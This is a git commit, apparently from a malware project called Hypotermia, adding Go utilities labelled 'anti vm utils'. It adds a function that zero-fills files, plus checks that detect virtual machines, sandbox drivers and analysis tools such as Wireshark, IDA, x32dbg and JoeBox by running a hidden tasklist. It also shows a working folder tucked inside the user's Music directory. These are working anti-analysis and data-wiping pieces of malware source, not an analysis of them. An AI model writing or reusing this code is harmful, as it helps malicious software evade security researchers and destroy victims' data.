a55cf231df5fa993526e40c9a22f2dfedf1c331f
chocolate <readonlychocolate@gmail.com>
2025-04-04 11:07:21 +0800

    anti vm utils

--- src/utils/files.go
+++ src/utils/files.go
@@ -22,3 +22,24 @@ func HideFolder(path string) error {
 func GetMainFolder() string {
 	return filepath.Join(os.Getenv("USERPROFILE"), "Music", config.HypotermiaName+"-"+config.Identifier)
 }
+
+func OverwriteFile(path string) error {
+	file, err := os.OpenFile(path, os.O_RDWR|os.O_TRUNC, 0666)
+	if err != nil {
+		return err
+	}
+
+	defer file.Close()
+
+	stat, err := file.Stat()
+	if err != nil {
+		return err
+	}
+
+	_, err = file.Write(make([]byte, stat.Size()))
+	if err != nil {
+		return err
+	}
+
+	return nil
+}
---
+++ src/utils/protection.go
@@ -0,0 +1,97 @@
+package utils
+
+import (
+	"os"
+	"os/exec"
+	"strings"
+	"syscall"
+)
+
+var vms = [5]string{
+	"vmGuestLib.dll",
+	"vm3dgl.dll",
+	"vboxhook.dll",
+	"vboxmrxnp.dll",
+	"vmsrvc.dll",
+}
+
+var drivers = [7]string{
+	"VBoxGuest.sys",
+	"VBoxSF.sys",
+	"VBoxVideo.sys",
+	"vm3dmp.sys",
+	"vmhgfs.sys",
+	"vmusbmouse.sys",
+	"vmsrvc.sys",
+}
+
+var processes = [27]string{
+	"vmtoolsd.exe",
+	"vmwaretray.exe",
+	"vmwareuser.exe",
+	"fakenet.exe",
+	"dumpcap.exe",
+	"httpdebuggerui.exe",
+	"wireshark.exe",
+	"fiddler.exe",
+	"vboxservice.exe",
+	"df5serv.exe",
+	"vboxtray.exe",
+	"vmwaretray.exe",
+	"ida64.exe",
+	"ollydbg.exe",
+	"pestudio.exe",
+	"vgauthservice.exe",
+	"vmacthlp.exe",
+	"x96dbg.exe",
+	"x32dbg.exe",
+	"prl_cc.exe",
+	"prl_tools.exe",
+	"xenservice.exe",
+	"qemu-ga.exe",
+	"joeboxcontrol.exe",
+	"ksdumperclient.exe",
+	"ksdumper.exe",
+	"joeboxserver.exe",
+}
+
+func CheckVMs() bool {
+	for _, vm := range vms {
+		if _, err := os.Stat("C:\\windows\\system32\\" + vm); os.IsNotExist(err) {
+			return false
+		}
+	}
+
+	return true
+}
+
+func CheckDrivers() bool {
+	for _, dr := range drivers {
+		if _, err := os.Stat("C:\\windows\\system32\\drivers\\" + dr); os.IsNotExist(err) {
+			return false
+		}
+	}
+
+	return true
+}
+
+func CheckProcesses() bool {
+	cmd := exec.Command("tasklist")
+	cmd.SysProcAttr = &syscall.SysProcAttr{
+		HideWindow: true,
+	}
+
+	out, err := cmd.Output()
+	if err != nil {
+		return false
+	}
+
+	procs := string(out)
+	for _, proc := range processes {
+		if strings.Contains(procs, proc) {
+			return true
+		}
+	}
+
+	return false
+}
